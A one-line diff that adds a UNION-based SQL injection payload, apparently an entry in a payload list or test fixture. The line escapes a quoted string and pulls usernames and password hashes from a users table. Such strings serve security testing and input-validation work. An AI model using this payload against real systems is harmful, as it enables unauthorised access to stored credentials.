@@ -1,0 +1,1 @@
+'"/**/UNION SELECT null, username, password_hash FROM core_auth.users WHERE '1'='1' -- -
